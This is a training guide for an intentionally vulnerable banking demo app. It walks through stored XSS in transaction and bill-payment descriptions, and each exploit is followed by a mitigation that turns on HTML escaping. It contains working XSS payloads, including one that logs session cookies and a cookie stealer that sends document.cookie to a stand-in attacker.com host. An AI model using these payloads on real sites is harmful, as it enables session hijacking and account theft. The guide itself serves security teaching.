# Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users. When user input is rendered without sanitization, attackers can execute arbitrary JavaScript in victims' browsers.

## Prerequisites

- Browser access to functioning web app
- One registered user account
- Access to browser developer console

## Configuration

Set the following in your `.env` file:

```
XSS_PROTECTION_ENABLED=false  # Vulnerable state
```

## Demonstrations

### Transaction Description XSS

Allows injection of malicious scripts through transaction descriptions.

#### Exploit

1. Log in to your account
2. Navigate to "Send Money" section in the dashboard
3. Fill in the transfer form:
   - **Recipient Account Number**: Enter any valid account number (e.g., `ACC1002` for another test user)
   - **Amount**: Enter any amount (e.g., `10.00`)
   - **Description**: Enter the following XSS payload:
     ```
     <img src=x onerror="alert('XSS Vulnerability!')">
     ```
4. Click "Transfer" button to submit the transaction
5. Navigate to "Transaction History" section on your dashboard
6. Observe the alert popup appears immediately when the page renders

**Expected Result (Vulnerable):** Alert popup displays "XSS Vulnerability!" demonstrating arbitrary JavaScript execution. The script executes every time the transaction history is viewed.

**Advanced Test**: Replace the payload with a cookie stealer to demonstrate data exfiltration:
```
<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
```
(Note: This will fail in a real scenario but demonstrates the attack vector)

#### Mitigate

1. Stop the application (Ctrl+C if running locally, or `docker-compose down` if using Docker)
2. Edit the `.env` file and update:
   ```
   XSS_PROTECTION_ENABLED=true
   ```
3. Restart the application:
   - Docker: `docker-compose up`
   - Local: `python app.py`
4. Repeat the exploit steps above (create a new transaction with the XSS payload)
5. Navigate to Transaction History

**Expected Result (Protected):** The payload is rendered as plain text: `<img src=x onerror="alert('XSS Vulnerability!')">` with no script execution. The HTML is escaped and displayed literally.

### Bill Payment XSS

Allows injection through bill payment categories and biller names. This demonstrates stored XSS that affects all users viewing payment options.

#### Exploit

##### Method 1: Via Browser Console (Direct Database Injection Simulation)

1. Log in to your account
2. Open browser developer tools (F12)
3. Go to Console tab
4. Execute the following command to view current bill categories:
   ```javascript
   fetch('/api/bill-categories', {
       headers: { 'Authorization': 'Bearer ' + localStorage.getItem('jwt_token') }
   }).then(r => r.json()).then(console.log);
   ```
5. Note: In a real attack scenario, an attacker with database access could inject XSS into category/biller names

##### Method 2: Via Payment Description (User Input)

1. Log in and navigate to "Bill Payments" section
2. Click "Pay Bill" button
3. Select any category (e.g., "Utilities") and biller (e.g., "Electric Company")
4. Fill in payment details:
   - **Amount**: Enter any amount (e.g., `50.00`)
   - **Payment Method**: Select "Account Balance" or "Virtual Card"
   - **Description**: Enter the following payload:
     ```
     <img src=x onerror="console.log('XSS in payment:',document.cookie)">
     ```
5. Submit the payment
6. Navigate to "Bill Payments" section and view payment history
7. Open browser console (F12 → Console tab)
8. Observe the XSS payload executes and logs session cookies

**Expected Result (Vulnerable):** Browser console displays session cookies with message "XSS in payment:" followed by the cookie data including JWT token.

#### Mitigate

1. Stop the application
2. Edit the `.env` file and update:
   ```
   XSS_PROTECTION_ENABLED=true
   ```
3. Restart the application
4. Repeat exploit steps (create a new payment with XSS payload in description)
5. View payment history and check browser console

**Expected Result (Protected):** HTML is escaped and displayed as plain text. Browser console shows no XSS execution. The payload appears as literal text: `<img src=x onerror="console.log('XSS in payment:',document.cookie)">`

## Technical Details

**Vulnerable Code:** Uses `innerHTML` without escaping user input
**Hardened Code:** Uses `escapeHTML()` function to escape HTML entities before rendering

The `escapeHTML()` function in `static/dashboard.js`:
- When `XSS_PROTECTION_ENABLED=false`: Returns raw string (vulnerable)
- When `XSS_PROTECTION_ENABLED=true`: Converts `<` to `&lt;`, `>` to `&gt;`, etc.

Affected files:
- `static/dashboard.js`: Frontend rendering logic with escapeHTML() wrapper
- Transaction history descriptions
- Bill payment category and biller names
